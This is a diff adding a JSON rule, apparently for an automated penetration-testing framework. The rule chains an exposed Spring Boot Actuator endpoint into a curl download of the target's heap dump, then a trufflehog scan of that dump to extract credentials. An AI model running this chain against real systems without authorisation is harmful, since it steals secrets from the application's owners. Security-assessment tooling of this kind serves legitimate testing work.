@@ -1,0 +1,33 @@
+{
+  "id": "R-CHAIN-ACTUATOR-HEAPDUMP",
+  "name": "Actuator→Heapdump→凭据",
+  "category": "chain",
+  "when": {
+    "all": [
+      {
+        "fact": "class",
+        "op": "contains",
+        "value": "exposure.actuator_env"
+      }
+    ]
+  },
+  "then": {
+    "hypothesis": "heapdump 提取凭据",
+    "actions": [
+      {
+        "tool": "curl",
+        "cmd": "curl -sS -f -A '{ua}' --max-filesize 2G -o {out}/heapdump.hprof {url}/actuator/heapdump"
+      },
+      {
+        "tool": "trufflehog",
+        "depends_on": [0],
+        "cmd": "trufflehog filesystem {out}/heapdump.hprof --json --no-verification"
+      }
+    ],
+    "on_hit_class": "secret.leak",
+    "priority": {
+      "impact": 0.85,
+      "cost": 0.25
+    }
+  }
+}
